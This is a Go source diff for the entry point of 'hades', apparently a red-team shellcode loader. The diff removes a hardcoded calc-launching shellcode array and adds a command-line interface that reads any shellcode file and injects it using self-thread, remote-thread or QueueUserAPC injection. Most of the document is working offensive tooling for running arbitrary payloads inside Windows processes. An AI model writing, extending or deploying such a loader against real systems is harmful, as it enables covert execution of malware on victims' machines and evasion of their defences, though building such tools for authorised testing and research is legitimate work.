@@ -4,49 +4,134 @@
 package main
 
 import (
+	"flag"
 	"fmt"
+	"io/ioutil"
+	"os"
+	"strings"
+	"time"
 
 	"github.com/f1zm0/hades/internal/loader"
 )
 
+var (
+	// version
+	version = "dev"
+
+	// date (build date).
+	date = time.Now().Format("02/01/06")
+
+	// author.
+	author = "@f1zm0"
+
+	// supported injection techniques
+	techniques = []string{
+		"selfthread",
+		"remotethread",
+		"queueuserapc",
+	}
+)
+
+func getBanner() string {
+	return fmt.Sprintf(`	
+  '||'  '||'     |     '||''|.   '||''''|   .|'''.|  
+   ||    ||     |||     ||   ||   ||  .     ||..  '  
+   ||''''||    |  ||    ||    ||  ||''|      ''|||.  
+   ||    ||   .''''|.   ||    ||  ||       .     '|| 
+  .||.  .||. .|.  .||. .||...|'  .||.....| |'....|' 
+
+          version: %s [%s] :: %s
+`, version, date, author)
+}
+
+type options struct {
+	shellcodeFilePath  string
+	injectionTechnique string
+}
+
+func parseCLIFlags() options {
+	flag.Usage = func() {
+		helpMsg := []string{
+			"Usage:",
+			"  hades [options] ",
+			"",
+			"Options:",
+			"  -f, --file <str>    shellcode file path (.bin)",
+			"  -t, --technique     injection technique to use ( selfthread, remotethread, queueuserapc)",
+			"",
+			"Examples",
+			"hades -f shellcode.bin -t selfthread",
+		}
+
+		fmt.Fprint(os.Stderr, strings.Join(helpMsg, "\n"))
+	}
+
+	opts := options{}
+
+	flag.StringVar(&opts.shellcodeFilePath, "f", "", "")
+	flag.StringVar(&opts.shellcodeFilePath, "file", "", "")
+
+	flag.StringVar(&opts.injectionTechnique, "t", "queueuserapc", "")
+	flag.StringVar(&opts.injectionTechnique, "technnique", "queueuserapc", "")
+
+	flag.Parse()
+
+	return opts
+}
+
+func contains(s []string, e string) bool {
+	for _, a := range s {
+		if e == a {
+			return true
+		}
+	}
+	return false
+}
+
 func main() {
-	// pop calc
-	calcSc := []byte{
-		0x31, 0xc0, 0x50, 0x68, 0x63, 0x61, 0x6c, 0x63,
-		0x54, 0x59, 0x50, 0x40, 0x92, 0x74, 0x15, 0x51,
-		0x64, 0x8b, 0x72, 0x2f, 0x8b, 0x76, 0x0c, 0x8b,
-		0x76, 0x0c, 0xad, 0x8b, 0x30, 0x8b, 0x7e, 0x18,
-		0xb2, 0x50, 0xeb, 0x1a, 0xb2, 0x60, 0x48, 0x29,
-		0xd4, 0x65, 0x48, 0x8b, 0x32, 0x48, 0x8b, 0x76,
-		0x18, 0x48, 0x8b, 0x76, 0x10, 0x48, 0xad, 0x48,
-		0x8b, 0x30, 0x48, 0x8b, 0x7e, 0x30, 0x03, 0x57,
-		0x3c, 0x8b, 0x5c, 0x17, 0x28, 0x8b, 0x74, 0x1f,
-		0x20, 0x48, 0x01, 0xfe, 0x8b, 0x54, 0x1f, 0x24,
-		0x0f, 0xb7, 0x2c, 0x17, 0x8d, 0x52, 0x02, 0xad,
-		0x81, 0x3c, 0x07, 0x57, 0x69, 0x6e, 0x45, 0x75,
-		0xef, 0x8b, 0x74, 0x1f, 0x1c, 0x48, 0x01, 0xfe,
-		0x8b, 0x34, 0xae, 0x48, 0x01, 0xf7, 0x99, 0xff,
-		0xd7,
+	fmt.Println(getBanner())
+	opts := parseCLIFlags()
+
+	// check if shellcode file exists
+	if _, err := os.Stat(opts.shellcodeFilePath); os.IsNotExist(err) {
+		fmt.Println("[-] shellcode file not found")
+		os.Exit(1)
+	}
+
+	// check if injection technique is supported by checking if the user-provided name is in techniques slice
+	if !contains(techniques, opts.injectionTechnique) {
+		fmt.Println("[-] injection technique not supported")
+		os.Exit(1)
+	}
+
+	// read binary file content
+	buf, err := ioutil.ReadFile(opts.shellcodeFilePath)
+	if err != nil {
+		fmt.Println(err)
 	}
 
 	ldr, err := loader.NewLoader()
 	if err != nil {
-		panic(err)
+		fmt.Println(err)
+		os.Exit(1)
 	}
 
-	// if err := ldr.SelfInjectThread(calcSc); err !+ nil {
-	// 	fmt.Printf("An error occured:\n%s\n", err.Error())
-	// }
+	// wait for user to click enter to continue
+	fmt.Println("Press enter to continue...")
+	_, _ = fmt.Scanln()
 
-	// if err := ldr.RemoteThreadInject(calcSc); err != nil {
-	// 	fmt.Printf("An error occured:\n%s\n", err.Error())
-	// }
-
-	if err := ldr.QueueUserAPC(calcSc); err != nil {
-		fmt.Printf("An error occured:\n%s\n", err.Error())
+	switch opts.injectionTechnique {
+	case "selfthread":
+		if err := ldr.SelfInjectThread(buf); err != nil {
+			fmt.Printf("An error occured:\n%s\n", err.Error())
+		}
+	case "remotethread":
+		if err := ldr.RemoteThreadInject(buf); err != nil {
+			fmt.Printf("An error occured:\n%s\n", err.Error())
+		}
+	default:
+		if err := ldr.QueueUserAPC(buf); err != nil {
+			fmt.Printf("An error occured:\n%s\n", err.Error())
+		}
 	}
-
-	// reader := bufio.NewReader(os.Stdin)
-	// fmt.Print("Press enter to continue ...")
-	// _, _ = reader.ReadString('\n')
 }
